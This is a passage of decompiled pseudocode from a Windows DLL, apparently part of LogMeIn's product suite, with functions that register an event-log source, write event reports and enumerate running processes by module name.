    else {
      FUN_10006250("missing dll name: \'%s\'\n",*piVar9 + 0xc,uVar2);
    }
  }
  else {
    piVar9 = (int *)FUN_1000ae10(&local_5c);
    if (*piVar9 == 0) {
      iVar6 = 0;
    }
    else {
      iVar6 = *piVar9 + 0xc;
    }
    FUN_10006250("dll exists: \'%s\'\n",iVar6,uVar2);
    local_6c = local_5c;
  }
  if (local_6c != (int *)0x0) {
    LOCK();
    iVar6 = *local_6c;
    *local_6c = *local_6c + -1;
    UNLOCK();
    if (iVar6 + -1 < 0) {
      FUN_100579ee(local_6c);
    }
  }
  ExceptionList = local_14;
  FUN_100579df();
  return;
}



/* Function: FUN_1003f630 */

undefined4 __fastcall FUN_1003f630(int *param_1,int *param_2)

{
  bool bVar1;
  int iVar2;
  int iVar3;
  int *piVar4;
  int iVar5;
  undefined1 local_18 [4];
  undefined4 local_14;
  undefined4 local_10;
  int *local_c;
  undefined4 local_8;
  
  bVar1 = false;
  local_c = param_2;
  if ((DAT_10099158 & 1) == 0) {
    DAT_10099158 = DAT_10099158 | 1;
    FUN_100064d0();
    FUN_10057b51(&LAB_10078190);
  }
  if ((DAT_10099100 == (code *)0x0) || (DAT_10099128 == (code *)0x0)) {
    return 0;
  }
  local_14 = 0;
  iVar2 = (*DAT_10099128)(0x80000002,L"System\\CurrentControlSet\\Services\\Eventlog\\Application",
                          &local_14);
  local_10 = 0;
  iVar3 = (*DAT_10099100)(0x80000002,L"System\\CurrentControlSet\\Services\\Eventlog\\Application",0
                          ,0,0,4,0,&local_10,local_18);
  if (iVar3 == 0) {
    local_8 = 0;
    if (*param_1 == 0) {
      iVar3 = 0;
    }
    else {
      iVar3 = *param_1 + 0xc;
    }
    iVar3 = (*DAT_10099100)(local_10,iVar3,0,0,0,2,0,&local_8,local_18);
    if (iVar3 == 0) {
      iVar3 = *local_c;
      if (iVar3 == 0) {
        iVar5 = 0;
        iVar3 = 0;
      }
      else {
        iVar5 = iVar3 + 0xc;
        iVar3 = *(int *)(iVar3 + 8);
      }
      iVar3 = iVar3 * 2 + 1;
      (*DAT_10099124)(local_8,L"EventMessageFile",0,2,iVar5,iVar3);
      (*DAT_10099124)(local_8,L"CategoryMessageFile",0,2,iVar5,iVar3);
      (*DAT_10099124)(local_8,L"ParameterMessageFile",0,2,iVar5,iVar3);
      local_c = (int *)0x7;
      (*DAT_10099124)(local_8,L"TypesSupported",0,4,&local_c,4);
      local_c = (int *)0x1;
      (*DAT_10099124)(local_8,L"CategoryCount",0,4,&local_c,4);
      bVar1 = true;
      (*DAT_1009910c)(local_8);
    }
    else if (iVar2 != 0) {
      piVar4 = (int *)FUN_1000ae10(&local_c);
      if (*piVar4 == 0) {
        iVar3 = 0;
      }
      else {
        iVar3 = *piVar4 + 0xc;
      }
      FUN_10006250("creating subkey failed: \'%s\'\n",iVar3);
      if (local_c != (int *)0x0) {
        LOCK();
        iVar3 = *local_c;
        *local_c = iVar3 + -1;
        UNLOCK();
        if (iVar3 + -1 < 0) {
          FUN_100579ee(local_c);
        }
      }
    }
    (*DAT_1009910c)(local_10);
    if (bVar1) {
      return 1;
    }
  }
  if (iVar2 == 0) {
    return 1;
  }
  return 0;
}



/* Function: FUN_1003f810 */

void FUN_1003f810(undefined4 param_1,undefined4 param_2,undefined4 param_3,undefined4 param_4)

{
  FUN_1003f830(param_2,param_3,param_4,&stack0x00000014);
  return;
}



/* Function: FUN_1003f830 */

void __thiscall
FUN_1003f830(int *param_1,undefined4 param_2,undefined4 param_3,undefined4 param_4,int param_5)

{
  uint uVar1;
  int iVar2;
  int *piVar3;
  uint uVar4;
  int *local_a4;
  int local_9c;
  int *local_98;
  int local_94 [32];
  uint local_14;
  void *local_10;
  undefined1 *puStack_c;
  undefined4 local_8;
  
  local_8 = 0xffffffff;
  puStack_c = &LAB_10077796;
  local_10 = ExceptionList;
  local_14 = DAT_100956e0 ^ (uint)&stack0xfffffffc;
  ExceptionList = &local_10;
  if ((DAT_10099158 & 1) == 0) {
    DAT_10099158 = DAT_10099158 | 1;
    FUN_100064d0(local_14);
    FUN_10057b51(&LAB_10078190);
  }
  if ((((*param_1 != 0) && (DAT_10099130 != (code *)0x0)) && (DAT_100990e0 != 0)) &&
     ((DAT_100990dc != 0 && (DAT_10099120 != 0)))) {
    uVar4 = 0;
    param_5 = param_5 + -4;
    do {
      piVar3 = (int *)(param_5 + 4);
      param_5 = param_5 + 4;
      if (*piVar3 == 0) break;
      uVar1 = uVar4 & 0xffff;
      uVar4 = uVar4 + 1;
      local_94[uVar1] = *piVar3;
    } while ((ushort)uVar4 < 0x20);
    FUN_1002e5e0(param_5);
    local_8 = 0;
    iVar2 = (*DAT_10099130)(*param_1,param_2,param_3,param_4,local_9c,uVar4,0,local_94,0);
    if (iVar2 == 0) {
      FUN_1001e7d0();
      local_8 = CONCAT31(local_8._1_3_,1);
      piVar3 = (int *)FUN_1000ae10(&local_98);
      if (*piVar3 == 0) {
        iVar2 = 0;
      }
      else {
        iVar2 = *piVar3 + 0xc;
      }
      FUN_10006250("ReportEventW: \'%s\'\n",iVar2);
      if (local_98 != (int *)0x0) {
        LOCK();
        iVar2 = *local_98;
        *local_98 = iVar2 + -1;
        UNLOCK();
        if (iVar2 + -1 < 0) {
          FUN_100579ee(local_98);
        }
      }
      if (local_a4 != (int *)0x0) {
        LOCK();
        iVar2 = *local_a4;
        *local_a4 = *local_a4 + -1;
        UNLOCK();
        if (iVar2 + -1 < 0) {
          FUN_100579ee(local_a4);
        }
      }
    }
    if (local_9c != 0) {
      FUN_100579ee(local_9c);
    }
  }
  ExceptionList = local_10;
  FUN_100579df();
  return;
}



/* Function: FUN_1003f9c0 */

undefined4 * __thiscall FUN_1003f9c0(int *param_1,undefined4 *param_2)

{
  undefined4 uVar1;
  
  if (*param_1 == 0) {
    uVar1 = FUN_1000bd10();
    *param_2 = uVar1;
    return param_2;
  }
  uVar1 = FUN_1000bd10();
  *param_2 = uVar1;
  return param_2;
}



/* Function: FUN_1003fa10 */

void __fastcall FUN_1003fa10(int *param_1,int *param_2,undefined4 param_3,int param_4)

{
  uint uVar1;
  undefined **ppuVar2;
  int *piVar3;
  int iVar4;
  int local_18;
  void *local_10;
  undefined1 *puStack_c;
  int local_8;
  
  local_8 = 0xffffffff;
  puStack_c = &LAB_100777d6;
  local_10 = ExceptionList;
  uVar1 = DAT_100956e0 ^ (uint)&stack0xfffffffc;
  ExceptionList = &local_10;
  iVar4 = *param_1;
  if ((iVar4 == 0) || (*(int *)(iVar4 + 8) == 0)) {
    ppuVar2 = &PTR_10083554;
  }
  else if (iVar4 == 0) {
    ppuVar2 = (undefined **)0x0;
  }
  else {
    ppuVar2 = (undefined **)(iVar4 + 0xc);
  }
  FUN_10033a00(ppuVar2,param_1);
  piVar3 = (int *)FUN_1000bd10(uVar1);
  local_8 = 0;
  if (local_18 == 0) {
    local_18 = 1;
  }
  switch(local_18) {
  case 1:
  case 5:
  case 6:
  case 7:
    if (param_4 == 0) {
      param_4 = 0x40020064;
    }
    break;
  case 2:
    piVar3 = (int *)FUN_1000bdd0(L"LMI Guardian",1);
    if (param_4 == 0) {
      param_4 = 0x40020065;
    }
    break;
  case 3:
    piVar3 = (int *)FUN_1000bdd0(L"LogMeIn Rescue",1);
    if (param_4 == 0) {
      param_4 = 0x40020066;
    }
    break;
  case 4:
    piVar3 = (int *)FUN_1000bdd0(L"LogMeIn Backup",1);
    if (param_4 == 0) {
      param_4 = 0x40020067;
    }
    break;
  case 8:
    piVar3 = (int *)FUN_1000bdd0(L"LogMeIn Storage",1);
    if (param_4 == 0) {
      param_4 = 0x4002006b;
    }
    break;
  case 9:
    piVar3 = (int *)FUN_1000bdd0(L"Join.Me",1);
    if (param_4 == 0) {
      param_4 = 0x4002006c;
    }
    else if (param_4 == -0x3ffdff98) {
      param_4 = -0x3ffdff93;
    }
    else if (param_4 == 0x40020069) {
      param_4 = 0x4002006e;
    }
    break;
  case 10:
    piVar3 = (int *)FUN_1000bdd0(L"LastPass AD Sync",1);
    if (param_4 == 0) {
      param_4 = -0x3ffdff91;
    }
    else if (param_4 == -0x3ffdff98) {
      param_4 = -0x3ffdff91;
    }
    else if (param_4 == 0x2006a) {
      param_4 = 0x20070;
    }
    else if (param_4 == 0x40020069) {
      param_4 = 0x40020071;
    }
  }
  if ((piVar3 == (int *)0x0) || (ppuVar2 = (undefined **)(piVar3 + 3), piVar3[2] == 0)) {
    ppuVar2 = &PTR_10083554;
  }
  if ((DAT_1009b624 & 1) == 0) {
    DAT_1009b624 = DAT_1009b624 | 1;
    local_8._0_1_ = 1;
    FUN_1003ef60(ppuVar2,ppuVar2);
    FUN_10057b51(&LAB_10078950);
    local_8 = (uint)local_8._1_3_ << 8;
  }
  if (*param_2 == 0) {
    iVar4 = 0;
  }
  else {
    iVar4 = *param_2 + 0xc;
  }
  FUN_1003f810(&DAT_1009b628,param_3,1,param_4,iVar4,0);
  if (piVar3 != (int *)0x0) {
    LOCK();
    iVar4 = *piVar3;
    *piVar3 = *piVar3 + -1;
    UNLOCK();
    if (iVar4 + -1 < 0) {
      FUN_100579ee(piVar3);
    }
  }
  ExceptionList = local_10;
  return;
}



/* Function: FUN_1003fc90 */

undefined4 * __thiscall
FUN_1003fc90(undefined4 *param_1,undefined4 param_2,undefined4 *param_3,undefined4 *param_4,
            short *param_5,undefined4 param_6,undefined4 param_7,undefined4 param_8,
            undefined4 param_9,undefined4 param_10)

{
  undefined4 uVar1;
  undefined4 uVar2;
  uint uVar3;
  undefined4 uVar4;
  void *local_10;
  undefined1 *puStack_c;
  undefined4 local_8;
  
  puStack_c = &LAB_10077816;
  local_10 = ExceptionList;
  uVar3 = DAT_100956e0 ^ (uint)&stack0xfffffffc;
  ExceptionList = &local_10;
  *param_1 = param_2;
  param_1[2] = *param_3;
  uVar4 = param_3[3];
  uVar1 = param_3[4];
  uVar2 = param_3[5];
  param_1[4] = param_3[2];
  param_1[5] = uVar4;
  param_1[6] = uVar1;
  param_1[7] = uVar2;
  param_1[8] = *param_4;
  uVar4 = param_4[3];
  uVar1 = param_4[4];
  uVar2 = param_4[5];
  param_1[10] = param_4[2];
  param_1[0xb] = uVar4;
  param_1[0xc] = uVar1;
  param_1[0xd] = uVar2;
  param_1[0xe] = 0;
  param_1[0xf] = 1;
  param_1[0x10] = 0;
  param_1[0x11] = 0;
  local_8 = 0;
  if ((param_5 == (short *)0x0) || (*param_5 != 0)) {
    uVar4 = FUN_1000bd10(uVar3);
  }
  else {
    uVar4 = FUN_1000ba60();
  }
  param_1[0x12] = uVar4;
  local_8 = CONCAT31(local_8._1_3_,1);
  param_1[0x13] = param_6;
  param_1[0x14] = param_7;
  param_1[0x15] = param_8;
  param_1[0x16] = param_9;
  param_1[0x17] = param_10;
  FUN_1003ff30();
  ExceptionList = local_10;
  return param_1;
}



/* Function: FUN_1003fd70 */

undefined4 FUN_1003fd70(undefined4 *param_1)

{
  int iVar1;
  undefined4 uVar2;
  undefined *puVar3;
  int *piVar4;
  int *local_3c;
  int *local_38;
  int local_30 [2];
  code *local_28;
  int iStack_24;
  int iStack_20;
  int iStack_1c;
  void *local_14;
  undefined1 *puStack_10;
  undefined4 local_c;
  
  local_c = 0xffffffff;
  puStack_10 = &LAB_10077850;
  local_14 = ExceptionList;
  ExceptionList = &local_14;
  if (param_1 != (undefined4 *)0x0) {
    FUN_1000bd10(DAT_100956e0 ^ (uint)&stack0xffffffb8);
    local_c = 0;
    local_3c = (int *)FUN_100155d0(*param_1,10);
    if (param_1[0x13] != 0) {
      FUN_1000bfa0(L" /CUSTOM ",0xffffffff);
      if ((int)param_1[0x13] < 0xb) {
        puVar3 = (&PTR_DAT_10084d00)[param_1[0x13] * 2];
      }
      else {
        puVar3 = (undefined *)0x0;
      }
      local_3c = (int *)FUN_1000bfa0(puVar3,0xffffffff);
    }
    if (param_1[0x14] != 0 || param_1[0x15] != 0) {
      FUN_1000bfa0(L" /evth=",0xffffffff);
      FUN_10031100(param_1[0x14],param_1[0x15],10);
      FUN_1000bfa0(L" /mfmh=",0xffffffff);
      local_3c = (int *)FUN_10031100(param_1[0x16],param_1[0x17],10);
    }
    if (local_3c == (int *)0x0) {
      piVar4 = (int *)0x0;
    }
    else {
      piVar4 = local_3c + 3;
    }
    FUN_10024730(piVar4,piVar4,param_1 + 0x11,param_1 + 0x10,0);
    local_c = CONCAT31(local_c._1_3_,1);
    local_28 = (code *)param_1[10];
    iStack_24 = param_1[0xb];
    iStack_20 = param_1[0xc];
    iStack_1c = param_1[0xd];
    local_30[0] = param_1[8];
    if (param_1[0xf] == 0) {
      param_1[0xf] = 1;
    }
    iVar1 = iStack_24;
    if (iStack_1c != 0) {
      iVar1 = *(int *)(*(int *)(iStack_20 + local_30[0]) + iStack_1c) + iStack_20 + iStack_24;
    }
    uVar2 = (*local_28)(iVar1 + local_30[0]);
    FUN_10006250("&(vRelease) = %X, nRef = %d\n",local_30,uVar2);
    if (local_38 != (int *)0x0) {
      LOCK();
      iVar1 = *local_38;
      *local_38 = iVar1 + -1;
      UNLOCK();
      if (iVar1 + -1 < 0) {
        FUN_100579ee(local_38);
      }
    }
    if (local_3c != (int *)0x0) {
      LOCK();
      iVar1 = *local_3c;
      *local_3c = *local_3c + -1;
      UNLOCK();
      if (iVar1 + -1 < 0) {
        FUN_100579ee(local_3c);
      }
    }
  }
  FUN_10058c33(0);
  ExceptionList = local_14;
  return 0;
}



/* Function: FUN_1003ff30 */

bool __fastcall FUN_1003ff30(int param_1)

{
  int iVar1;
  undefined4 uVar2;
  int local_8;
  
  if ((*(int *)(param_1 + 0x3c) != 0) && (*(int *)(param_1 + 0x38) == 0)) {
    *(undefined4 *)(param_1 + 0x3c) = 0;
    local_8 = param_1;
    iVar1 = FUN_10058b59(0,0,FUN_1003fd70,param_1,0,&local_8);
    *(int *)(param_1 + 0x38) = iVar1;
    if (iVar1 != 0) {
      uVar2 = FUN_100400f0();
      FUN_10006250("&m_rAddRef = %X, nRef = %d\n",param_1 + 8,uVar2);
    }
    return *(int *)(param_1 + 0x38) != 0;
  }
  return false;
}



/* Function: FUN_1003ffa0 */

void __fastcall FUN_1003ffa0(int param_1)

{
  int iVar1;
  uint uVar2;
  undefined **ppuVar3;
  void *local_14;
  undefined1 *puStack_10;
  undefined4 local_c;
  
  local_c = 0xffffffff;
  puStack_10 = &LAB_100751e0;
  local_14 = ExceptionList;
  uVar2 = DAT_100956e0 ^ (uint)&stack0xffffffc8;
  if (*(int *)(param_1 + 0x3c) != 0) {
    return;
  }
  ExceptionList = &local_14;
  *(undefined4 *)(param_1 + 0x3c) = 1;
  if (*(int *)(param_1 + 0x50) != 0 || *(int *)(param_1 + 0x54) != 0) goto LAB_1004004c;
  iVar1 = *(int *)(param_1 + 0x44);
  if ((iVar1 == 0) || (*(int *)(iVar1 + 8) == 0)) {
    ppuVar3 = &PTR_10083554;
LAB_10040012:
    FUN_1000ba60();
  }
  else {
    if (iVar1 == 0) {
      ppuVar3 = (undefined **)0x0;
    }
    else {
      ppuVar3 = (undefined **)(iVar1 + 0xc);
      if ((ppuVar3 != (undefined **)0x0) && (*(short *)ppuVar3 == 0)) goto LAB_10040012;
    }
    FUN_1000bd10(uVar2);
  }
  local_c = 0;
  FUN_100333d0(ppuVar3);
  local_c = CONCAT31(local_c._1_3_,1);
  FUN_10033350();
  FUN_1001a3b0();
LAB_1004004c:
  (*DAT_10079310)(1);
  ExceptionList = local_14;
  return;
}



/* Function: FUN_10040070 */

undefined4 __fastcall FUN_10040070(int param_1)

{
  code *pcVar1;
  int iVar2;
  int iVar3;
  
  pcVar1 = DAT_10079310;
  if (*(int *)(param_1 + 0x3c) == 0) {
    if (*(int *)(param_1 + 0x38) != 0) {
      iVar2 = *(int *)(param_1 + 0x40);
      for (iVar3 = 0x1e; (iVar2 == 0 && (0 < iVar3)); iVar3 = iVar3 + -1) {
        (*pcVar1)(100);
        iVar2 = *(int *)(param_1 + 0x40);
      }
      return 1;
    }
    if (*(int *)(param_1 + 0x3c) == 0) {
      return 0;
    }
  }
  if (((*(int *)(param_1 + 0x38) != 0) && (*(int *)(param_1 + 0x3c) != 0)) &&
     (*(int *)(param_1 + 0x38) != 0)) {
    iVar2 = FUN_10218ccd();
    if (iVar2 != -1) {
      (*DAT_10079270)(*(undefined4 *)(param_1 + 0x38));
    }
    *(undefined4 *)(param_1 + 0x38) = 0;
  }
  return 0;
}



/* Function: FUN_100400f0 */

void __fastcall FUN_100400f0(int *param_1)

{
  if (param_1[5] == 0) {
    (*(code *)param_1[2])(param_1[3] + *param_1);
    return;
  }
  (*(code *)param_1[2])
            (*(int *)(*(int *)(*param_1 + param_1[4]) + param_1[5]) + param_1[3] + *param_1 +
             param_1[4]);
  return;
}



/* Function: FUN_10040130 */

/* WARNING: Removing unreachable block (ram,0x10040541) */
/* WARNING: Removing unreachable block (ram,0x10040548) */
/* WARNING: Removing unreachable block (ram,0x10040549) */

int * __thiscall FUN_10040130(int *param_1,undefined4 param_2,undefined4 param_3,int param_4)

{
  undefined1 *puVar1;
  int iVar2;
  int iVar3;
  int *piVar4;
  int *piVar5;
  undefined1 *puVar6;
  int iVar7;
  undefined4 uVar8;
  int *piVar9;
  char *pcVar10;
  undefined1 *puVar11;
  uint uVar12;
  uint uVar13;
  undefined1 local_50 [4];
  int local_4c;
  int *local_48;
  int *local_44;
  int *local_40;
  int *local_3c;
  undefined4 local_38;
  int *local_34;
  int *local_30;
  uint local_2c;
  int *local_28;
  int *local_24;
  uint local_20;
  uint local_1c;
  int *local_18;
  char local_11;
  void *local_10;
  undefined1 *puStack_c;
  undefined4 local_8;
  
  local_8 = 0xffffffff;
  puStack_c = &LAB_100778cb;
  local_10 = ExceptionList;
  ExceptionList = &local_10;
  local_34 = param_1;
  if ((DAT_1009b554 & 1) == 0) {
    DAT_1009b554 = DAT_1009b554 | 1;
    FUN_1001aca0(DAT_100956e0 ^ (uint)&stack0xfffffffc);
    FUN_10057b51(&DAT_10078500);
  }
  local_30 = param_1 + 1;
  *param_1 = (int)&DAT_1009b560;
  *local_30 = 0;
  param_1[2] = 0;
  param_1[3] = 0;
  if (*(int *)(*param_1 + 4) != 0) {
    uVar12 = 1;
    local_8 = 1;
    while( true ) {
      FUN_10040710(uVar12);
      iVar2 = (**(code **)(*param_1 + 4))(0,uVar12 * 4,&local_2c);
      if (iVar2 == 0) break;
      uVar13 = local_2c >> 2;
      local_20 = uVar13;
      FUN_10040710(uVar13);
      if (uVar13 < uVar12) {
        if ((uint)((param_1[3] - param_1[1]) / 0xc) < uVar13) {
          if (0x15555555 < uVar13) {
            FUN_10056a6a("vector<T> too long");
          }
          FUN_10040770(uVar13);
        }
        local_1c = 0;
        if (uVar13 == 0) {
          ExceptionList = local_10;
          return param_1;
        }
        do {
          uVar12 = local_1c;
          local_2c = *(uint *)(local_1c * 4);
          iVar2 = FUN_10409cac(local_2c,0x410,0,local_2c);
          piVar5 = local_34;
          local_24 = (int *)0x0;
          local_8._0_1_ = 3;
          local_4c = iVar2;
          if ((iVar2 != 0) &&
             (iVar3 = (**(code **)(*local_34 + 8))(iVar2,&local_38,4,local_50), uVar12 = local_1c,
             iVar3 != 0)) {
            piVar4 = (int *)FUN_10010370(0x105,1);
            if (piVar4 == (int *)0x0) {
              piVar9 = (int *)0x0;
            }
            else {
              piVar9 = piVar4 + 3;
            }
            local_24 = piVar4;
            (**(code **)(*piVar5 + 0x14))(iVar2,local_38,piVar9,0x104);
            uVar12 = local_1c;
            uVar13 = local_20;
            if (piVar4 != (int *)0x0) {
              piVar5 = piVar4 + 3;
              if (piVar5 == (int *)0x0) {
                iVar3 = 0;
              }
              else {
                piVar9 = piVar5;
                do {
                  iVar3 = *piVar9;
                  piVar9 = (int *)((int)piVar9 + 2);
                } while ((short)iVar3 != 0);
                iVar3 = (int)piVar9 - ((int)piVar4 + 0xe) >> 1;
              }
              piVar4[2] = iVar3;
              *(undefined2 *)((int)piVar4 + iVar3 * 2 + 0xc) = 0;
              if ((piVar5 != (int *)0x0) && (piVar4[2] != 0)) {
                piVar5 = (int *)FUN_1000ae10(&local_3c);
                if ((*piVar5 == 0) ||
                   ((pcVar10 = (char *)(*piVar5 + 0xc), pcVar10 == (char *)0x0 || (*pcVar10 != '\0')
                    ))) {
                  local_18 = (int *)FUN_100075b0();
                }
                else {
                  local_18 = (int *)FUN_10007ae0();
                }
                if (local_3c != (int *)0x0) {
                  LOCK();
                  iVar3 = *local_3c;
                  *local_3c = iVar3 + -1;
                  UNLOCK();
                  if (iVar3 + -1 < 0) {
                    FUN_100579ee(local_3c);
                  }
                }
                FUN_10027a40();
                if (param_4 == 0) {
                  local_28 = (int *)0x0;
                  uVar8 = FUN_10019e10(&local_48);
                  local_8 = CONCAT31(local_8._1_3_,9);
                  FUN_10026a20(uVar8);
                  if (local_48 != (int *)0x0) {
                    LOCK();
                    iVar3 = *local_48;
                    *local_48 = iVar3 + -1;
                    UNLOCK();
                    if (iVar3 + -1 < 0) {
                      FUN_100579ee(local_48);
                    }
                  }
                  piVar5 = local_28;
                  LOCK();
                  *piVar4 = *piVar4 + 1;
                  UNLOCK();
                  if (local_28 != (int *)0x0) {
                    LOCK();
                    *local_28 = *local_28 + 1;
                    UNLOCK();
                  }
                  uVar8 = FUN_100406a0(local_2c,local_28,piVar4);
                  local_8._0_1_ = 10;
                  FUN_100405b0(uVar8);
LAB_100404cb:
                  FUN_10040570();
                  if (piVar5 != (int *)0x0) {
                    LOCK();
                    iVar3 = *piVar5;
                    *piVar5 = iVar3 + -1;
                    UNLOCK();
                    if (iVar3 + -1 < 0) {
                      FUN_100579ee(piVar5);
                    }
                  }
                }
                else {
                  iVar3 = 0;
                  do {
                    piVar5 = (int *)FUN_10019e10(&local_40);
                    puVar1 = *(undefined1 **)(param_4 + iVar3 * 4);
                    if (*piVar5 == 0) {
                      puVar6 = (undefined1 *)0x0;
                    }
                    else {
                      puVar6 = (undefined1 *)(*piVar5 + 0xc);
                    }
                    puVar11 = &DAT_10083790;
                    if (puVar6 != (undefined1 *)0x0) {
                      puVar11 = puVar6;
                    }
                    puVar6 = &DAT_10083790;
                    if (puVar1 != (undefined1 *)0x0) {
                      puVar6 = puVar1;
                    }
                    iVar7 = FUN_102649a8(&stack0xfffffffc,puVar11,puVar6);
                    local_11 = iVar7 == 0;
                    if (local_40 != (int *)0x0) {
                      LOCK();
                      iVar7 = *local_40;
                      *local_40 = iVar7 + -1;
                      UNLOCK();
                      if (iVar7 + -1 < 0) {
                        FUN_100579ee(local_40);
                      }
                    }
                    if (local_11 != '\0') {
                      local_28 = (int *)0x0;
                      uVar8 = FUN_10019e10(&local_44);
                      local_8 = CONCAT31(local_8._1_3_,6);
                      FUN_10026a20(uVar8);
                      if (local_44 != (int *)0x0) {
                        LOCK();
                        iVar3 = *local_44;
                        *local_44 = iVar3 + -1;
                        UNLOCK();
                        if (iVar3 + -1 < 0) {
                          FUN_100579ee(local_44);
                        }
                      }
                      piVar5 = local_28;
                      LOCK();
                      *piVar4 = *piVar4 + 1;
                      UNLOCK();
                      if (local_28 != (int *)0x0) {
                        LOCK();
                        *local_28 = *local_28 + 1;
                        UNLOCK();
                      }
                      uVar8 = FUN_100406a0(local_2c,local_28,piVar4);
                      local_8._0_1_ = 7;
                      FUN_100405b0(uVar8);
                      goto LAB_100404cb;
                    }
                    iVar3 = iVar3 + 1;
                  } while (iVar3 == 0);
                }
                if (local_18 != (int *)0x0) {
                  LOCK();
                  iVar3 = *local_18;
                  *local_18 = iVar3 + -1;
                  UNLOCK();
                  if (iVar3 + -1 < 0) {
                    FUN_100579ee(local_18);
                  }
                }
              }
              LOCK();
              iVar3 = *piVar4;
              *piVar4 = iVar3 + -1;
              UNLOCK();
              uVar12 = local_1c;
              uVar13 = local_20;
              if (iVar3 + -1 < 0) {
                FUN_100579ee(piVar4);
                uVar12 = local_1c;
                uVar13 = local_20;
              }
            }
          }
          local_8 = CONCAT31(local_8._1_3_,1);
          if ((DAT_10079270 != (code *)0x0) && (iVar2 != 0)) {
            (*DAT_10079270)(iVar2);
          }
          local_1c = uVar12 + 1;
          if (uVar13 <= local_1c) {
            ExceptionList = local_10;
            return local_34;
          }
        } while( true );
      }
      uVar12 = uVar12 * 2;
    }
  }
  ExceptionList = local_10;
  return param_1;
}



/* Function: FUN_10040570 */

void __fastcall FUN_10040570(int param_1)

{
  int iVar1;
  int *piVar2;
  
  piVar2 = *(int **)(param_1 + 8);
  if (piVar2 != (int *)0x0) {
    LOCK();
    iVar1 = *piVar2;
    *piVar2 = iVar1 + -1;
    UNLOCK();
    if (iVar1 + -1 < 0) {
      FUN_100579ee(piVar2);
    }
  }
  piVar2 = *(int **)(param_1 + 4);
  if (piVar2 != (int *)0x0) {
    LOCK();
    iVar1 = *piVar2;
    *piVar2 = *piVar2 + -1;
    UNLOCK();
    if (iVar1 + -1 < 0) {
      FUN_100579ee(piVar2);
    }
  }
  return;
}



/* Function: FUN_100405b0 */

void __thiscall FUN_100405b0(uint *param_1,undefined4 *param_2)

{
  undefined4 *puVar1;
  int *piVar2;
  undefined4 *puVar3;
  
  puVar3 = (undefined4 *)param_1[1];
  if ((param_2 < puVar3) && (puVar1 = (undefined4 *)*param_1, puVar1 <= param_2)) {
    if (puVar3 == (undefined4 *)param_1[2]) {
      FUN_10040810(puVar3);
    }
    puVar3 = (undefined4 *)param_1[1];
    puVar1 = (undefined4 *)(*param_1 + (((int)param_2 - (int)puVar1) / 0xc) * 0xc);
    if (puVar3 == (undefined4 *)0x0) goto LAB_10040650;
    *puVar3 = *puVar1;
    piVar2 = (int *)puVar1[1];
    puVar3[1] = piVar2;
    if (piVar2 != (int *)0x0) {
      LOCK();
      *piVar2 = *piVar2 + 1;
      UNLOCK();
    }
    piVar2 = (int *)puVar1[2];
  }
  else {
    if (puVar3 == (undefined4 *)param_1[2]) {
      FUN_10040810(puVar3);
    }
    puVar3 = (undefined4 *)param_1[1];
    if (puVar3 == (undefined4 *)0x0) goto LAB_10040650;
    *puVar3 = *param_2;
    piVar2 = (int *)param_2[1];
    puVar3[1] = piVar2;
    if (piVar2 != (int *)0x0) {
      LOCK();
      *piVar2 = *piVar2 + 1;
      UNLOCK();
    }
    piVar2 = (int *)param_2[2];
  }
  puVar3[2] = piVar2;
  if (piVar2 != (int *)0x0) {
    LOCK();
    *piVar2 = *piVar2 + 1;
    UNLOCK();
  }
LAB_10040650:
  param_1[1] = param_1[1] + 0xc;
  return;
}



/* Function: FUN_10040660 */

void __fastcall FUN_10040660(int *param_1)

{
  if (*param_1 != 0) {
    FUN_10040920(*param_1,param_1);
    thunk_FUN_100579ee(*param_1);
    *param_1 = 0;
    param_1[1] = 0;
    param_1[2] = 0;
  }
  return;
}



/* Function: FUN_100406a0 */

undefined4 * __thiscall
FUN_100406a0(undefined4 *param_1,undefined4 param_2,int *param_3,int *param_4)

{
  int iVar1;
  
  *param_1 = param_2;
  param_1[1] = param_3;
  if (param_3 != (int *)0x0) {
    LOCK();
    *param_3 = *param_3 + 1;
    UNLOCK();
  }
  param_1[2] = param_4;
  if (param_4 != (int *)0x0) {
    LOCK();
    *param_4 = *param_4 + 1;
    UNLOCK();
  }
  if (param_3 != (int *)0x0) {
    LOCK();
    iVar1 = *param_3;
    *param_3 = iVar1 + -1;
    UNLOCK();
    if (iVar1 + -1 < 0) {
      FUN_100579ee(param_3);
    }
  }
  if (param_4 != (int *)0x0) {
    LOCK();
    iVar1 = *param_4;
    *param_4 = *param_4 + -1;
    UNLOCK();
    if (iVar1 + -1 < 0) {
      FUN_100579ee(param_4);
    }
  }
  return param_1;
}



/* Function: FUN_10040710 */

void __thiscall FUN_10040710(int *param_1,uint param_2)

{
  int iVar1;
  uint uVar2;
  undefined4 *puVar3;
  
  uVar2 = param_1[1] - *param_1 >> 2;
  if (uVar2 <= param_2) {
    if (uVar2 < param_2) {
      FUN_100408a0(param_2 - uVar2);
      puVar3 = (undefined4 *)param_1[1];
      iVar1 = param_2 - ((int)puVar3 - *param_1 >> 2);
      if (iVar1 != 0) {
        for (; iVar1 != 0; iVar1 = iVar1 + -1) {
          *puVar3 = 0;
          puVar3 = puVar3 + 1;
        }
      }
      param_1[1] = param_1[1] + (param_2 - (param_1[1] - *param_1 >> 2)) * 4;
    }
    return;
  }
  param_1[1] = param_1[1] + (param_2 - uVar2) * 4;
  return;
}



/* Function: FUN_10040770 */

void __thiscall FUN_10040770(int *param_1,uint param_2)

{
  code *pcVar1;
  int iVar2;
  int iVar3;
  
  iVar3 = 0;
  if (param_2 != 0) {
    if (param_2 < 0x15555556) {
      iVar3 = FUN_100582fa(param_2 * 0xc);
      if (iVar3 != 0) goto LAB_1004079e;
    }
    FUN_10056a39();
    pcVar1 = (code *)swi(3);
    (*pcVar1)();
    return;
  }
LAB_1004079e:
  FUN_10040970(iVar3);
  iVar2 = (param_1[1] - *param_1) / 0xc;
  if (*param_1 != 0) {
    FUN_10040920(iVar2,iVar2);
    thunk_FUN_100579ee(*param_1);
  }
  *param_1 = iVar3;
  param_1[2] = iVar3 + param_2 * 0xc;
  param_1[1] = iVar3 + iVar2 * 0xc;
  return;
}



/* Function: FUN_10040810 */

void __fastcall FUN_10040810(int *param_1)

{
  code *pcVar1;
  int iVar2;
  uint uVar3;
  int iVar4;
  uint uVar5;
  
  iVar4 = param_1[2] - param_1[1];
  iVar2 = iVar4 >> 0x1f;
  if (iVar4 / 0xc + iVar2 == iVar2) {
    iVar2 = (param_1[1] - *param_1) / 0xc;
    if (iVar2 == 0x15555555) {
      FUN_10056a6a("vector<T> too long");
      pcVar1 = (code *)swi(3);
      (*pcVar1)();
      return;
    }
    uVar5 = iVar2 + 1;
